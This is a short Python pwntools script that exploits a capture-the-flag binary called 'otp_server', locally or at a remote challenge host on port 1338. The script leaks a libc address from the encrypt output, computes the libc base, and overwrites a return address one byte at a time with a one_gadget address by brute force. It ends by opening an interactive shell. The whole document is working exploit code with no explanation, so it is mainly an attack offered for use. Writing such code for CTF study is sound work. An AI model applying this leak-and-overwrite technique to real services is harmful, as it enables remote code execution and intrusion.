#!/usr/bin/env python
from pwn import *

def set_key(key):
    s.sendlineafter('>>> ', '1')
    s.sendafter('key:\n', key + '\0')

def encrypt(message):
    s.sendlineafter('>>> ', '2')
    s.sendafter('encrypt:\n', message)
    s.recvuntil('MESSAGE -----\n')
    return s.recvuntil('MESSAGE -----\n')[:-0x27]

def quit():
    s.sendlineafter('>>> ', '3')

if len(sys.argv) == 1:
    s = process('./otp_server')
else:
    s = remote('challenges3.fbctf.com', 1338)

set_key('A' * 0x1c)
libc_base = u64(encrypt('A' * 0x100)[-0xc:-0x4]) - 0x21b97
log.info('libc base: %#x' % libc_base)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
for i, b in enumerate(p64(libc_base + one_gadgets[1])):
    set_key('A' * (0x14 + i))
    while True:
        if ord(encrypt('A' * 0x100)[0]) ^ 0x41 == ord(b):
            break
quit()

s.interactive()
